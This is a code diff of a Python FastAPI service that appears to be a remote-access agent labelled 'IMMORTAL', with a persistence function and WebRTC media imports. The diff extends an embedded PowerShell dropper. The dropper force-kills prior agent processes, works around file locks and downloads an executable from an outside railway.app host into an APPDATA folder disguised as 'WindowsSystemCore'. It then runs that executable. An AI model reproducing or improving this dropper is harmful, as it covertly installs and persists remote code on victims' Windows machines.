@@ -14,7 +14,7 @@ import uvicorn
 from fastapi.responses import HTMLResponse
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.1.8-IMMORTAL"
+AGENT_VERSION = "9.1.9-IMMORTAL"
 app = FastAPI()
 
 def install_persistence():
@@ -125,15 +125,24 @@ def get_script():
 $exeUrl = "https://web-production-d6db5.up.railway.app/api/client_exe"
 $targetDir = "$env:APPDATA\\WindowsSystemCore"
 $targetExe = "$targetDir\\sys_core.exe"
+$backupExe = "$targetDir\\sys_core_old.exe"
 
+# --- Aggressive Termination ---
 taskkill /F /IM sys_core.exe /T 2>$null
 taskkill /F /IM mrl_agent.exe /T 2>$null
 Start-Sleep -Seconds 3
 
+# --- File Lock Bypass Sequence ---
+if (Test-Path -Path $targetExe) {{
+    Remove-Item -Path $backupExe -Force -ErrorAction SilentlyContinue 
+    Move-Item -Path $targetExe -Destination $backupExe -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $targetExe -Force -ErrorAction SilentlyContinue
+}}
+
 if (-not (Test-Path -Path $targetDir)) {{ New-Item -ItemType Directory -Path $targetDir -Force }}
 
 Write-Host "Downloading Core Engine... Please wait (~90MB)" -ForegroundColor Cyan
-Invoke-WebRequest -Uri $exeUrl -OutFile $targetExe -UseBasicParsing
+Invoke-WebRequest -Uri $exeUrl -OutFile $targetExe -UseBasicParsing -ErrorAction Stop
 
 Write-Host "Initializing Bootloader Sequence..." -ForegroundColor Green
 Start-Process -FilePath $targetExe
